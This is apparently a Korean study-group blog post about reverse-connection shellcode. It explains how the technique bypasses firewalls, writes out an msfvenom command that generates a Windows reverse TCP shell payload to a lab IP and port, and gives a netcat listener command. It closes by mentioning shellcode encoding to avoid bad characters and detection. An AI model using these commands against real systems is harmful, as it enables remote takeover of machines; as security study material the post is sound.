---
layout: post
title: SUA 시스템 해킹 스터디 - 리버스 커넥션 쉘코드
---

### 170924 8주차

<br>
## 3. 리버스 커넥션 쉘코드

이전 [포스트](https://handongchoi.com/2017/09/17/system-hacking-day-8/)에서 살펴봤던 포트 바인딩 쉘코드는 단점이 하나 있다. 대부분의 서버에는 방화벽이 있기 때문에 막상 포트를 열었어도 접속하지 못하는 경우가 생긴다. 이러한 경우, 방화벽을 우회하기 위해 리버스 커넥션 쉘코드를 사용한다.
> 리버스 커넥션이란, 대부분의 방화벽에서 아웃바운드(*outbound*) 트래픽을 차단하지 않는다는 점을 이용해 타켓 시스템(*내부망*)에서 공격자의 PC(*외부망*)로 거꾸로 접속을 하도록 만드는 것이다. 아웃바운드와 인바운드의 차이점은 [여기](https://zetawiki.com/wiki/인바운드,_아웃바운드)서 확인할 수 있다.

쉘코드가 실행되면, 소켓이나 파이프를 통해 입출력값을 리다이렉트 시켜서 공격자가 명령을 수행할 수 있도록 해 주며 공격자는 방화벽을 우회하여 타겟 시스템의 쉘을 얻을 수 있게 된다.

이번에도 마찬가지로, msfvenom을 이용해서 리버스 커넥션 쉘코드를 만들어 보자. Kali Linux에 로그인하고 터미널을 열어서 아래와 같이 msfvenom 명령어를 실행한다. 여기서 lhost 옵션은 자신의 IP를 입력한다. 결과적으로, 타겟 시스템에서 쉘코드 실행 시 입력한 IP와 포트로 쉘을 연결해 준다.

<p style="text-align:center;">
  <img src="https://raw.githubusercontent.com/henrychoi7/henrychoi7.github.io/master/img/170924/rcs1.png" width="80%">
</p>
> `msfvenom -p windows/shell_reverse_tcp lhost=192.168.1.7 lport=7777 -a x86 -f c --platform windows`

위 쉘코드를 Visual Studio에서 실행시켜 보자. 실행하기 전에 먼저 원격(*자신의 PC*)에서 포트를 열고 대기한다. 여기서는 192.168.1.7 IP를 가진 PC에서 7777 포트를 열고 대기하며, 포트는 임의로 설정한다.

<p style="text-align:center;">
  <img src="https://raw.githubusercontent.com/henrychoi7/henrychoi7.github.io/master/img/170924/rcs4.png" width="80%">
</p>
> `nc -l 7777`

<p style="text-align:center;">
  <img src="https://raw.githubusercontent.com/henrychoi7/henrychoi7.github.io/master/img/170924/rcs2.jpg" width="80%">
</p>
> Visual Studio에서 빌드한 후, 실행시킨다.

Visual Studio에서 실행시킨 결과, 아래처럼 정상적으로 자신의 PC에서 쉘에 접속되는 것을 확인할 수 있다. 모의해킹이나 실제 환경에서는 리버스 커넥션 쉘코드의 활용도가 높기 때문에 꼭 실습하고 이해하고 넘어가자.

<p style="text-align:center;">
  <img src="https://raw.githubusercontent.com/henrychoi7/henrychoi7.github.io/master/img/170924/rcs3.png" width="80%">
</p>

Exploit을 작성하고 공격을 수행하다가 쉘코드가 제대로 실행되지 않는 경우가 있다. 공격에 사용했던 쉘코드가 실행되기 전에 메모리 상에서 변형되는 경우가 종종 있기 때문이다.

프로그램 내부에서 우리가 입력한 값을 처리할 때 대문자가 소문자로 변하거나, 소문자가 대문자로 변하거나, 유니코드로 변환되어 중간에 널바이트가 삽입되기도 한다. 특히, 여태까지 설명했던 대로 대부분의 문자열 복사 함수에서 널바이트를 만나면 문자열의 끝으로 인식하여 더 이상 복사를 수행하지 않는다. Exploit을 성공시키기 위해 쉘코드에서 제외되어야 하는 문자를 bad char라고 부르며, 이 bad char를 제거하기 위해 쉘코드 인코딩을 이용하게 된다.

인코딩은 탐지를 회피하기 위한 목적으로 자주 사용되며, 기존의 쉘코드와 전혀 다른 코드처럼 보인다. 다음 시간에는 Metasploit 프레임워크에 포함된 msfvenom(*msfpayload와 마찬가지로, msfencode도 msfvenom 명령어로 대신함*)를 이용해 쉘코드 인코딩을 구현하고, 직접 XOR 쉘코드 인코더를 만들어 보자.
